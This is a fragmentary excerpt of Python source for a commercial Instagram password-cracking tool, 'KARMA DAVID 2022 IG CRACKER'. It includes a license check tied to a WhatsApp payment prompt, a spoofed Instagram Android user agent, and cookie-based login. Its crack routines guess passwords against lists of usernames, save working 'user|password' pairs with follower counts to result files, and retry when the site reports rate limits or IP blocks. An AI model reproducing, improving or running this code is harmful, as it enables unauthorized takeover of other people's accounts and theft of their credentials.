...
def xoshnaw():
  ...
  print('\r        TOOL PRICE 10K | 1 WEEKS\n')
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "-".join(uuid)
  print("\x1b[37;1m     YOUR ID : "+id)
  try:
    httpCaht = requests.get("https://github.com/dh34ma/ig/blob/main/ig").text
    if id in httpCaht:
      ...
      os.system('am start https://wa.me/+2348110044418?text=Hi+Karma+i+Want+to+pay+for+IG+linces:+'+id+'>/dev/null');jeda(1)
      time.sleep(1)
      sys.exit()
  except:
    sys.exit()
...
USN="Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)"
...
def banner():
	clear()
	wel = '                  KARMA DAVID 2022 IG CRACKER'
	wel2 = mark(wel, style='red')
	sol().print(wel2)
	au='OWNER     :  KARMA\nGITHUB    :  https://github.com/Karma-kh3n\nWHATSAPP  :  08110044418'
	pengembang1=nel(au,style="red")
	cetak(nel(pengembang1, title='KARMA DAVID'))
...
def checkin():
        try:
            ...
            oi = nel(io, style='red')
            cetak(nel(oi, title='Cookie Login'))
            loginpil=input(f"[➣] SELECT :{C} ")
            if loginpil=='1':
                wel = '# CREATE NEW IG ACCOUNT TO LOGIN'
                wel2 = mark(wel, style='red')
                sol().print(wel2)
                us=input(f'{CY}[➣] IG USERNAME :{C}')
                cok=input(f'{CY}[➣] IG COOKIE:{C}')
...
[>E] EXIT
	...
	def passwordAPI(self,xnx):
		print(f'\n {C}{M} Total Username {C}{len(internal)}{M}')
		print(f"""
...
#					"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999),pw),
				...
				if "userId" in str(x_jason):
					...
					cetak(nel(oi, title='KARMA- CP'))
					open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					checkpoint.append(user)
					break

				elif 'Please wait a few minutes' in str(x.text):
					sys.stdout.write(f"\r┣[{H}!{H}] {H}IP SPAM{H}");sys.stdout.flush();sleep(0)
#					self.crackAPI(user,pas)
				elif 'ip_block' in str(x.text):
					sys.stdout.write(f"\r┣[{H}!{H}] {H}IP BLOCK{H}");sys.stdout.flush();sleep(0)
					self.crackAPI(user,pas)
...
if __name__=='__main__':
	try:
		...
		exit(f'\n [{H}!{H}] Internet connection problem')
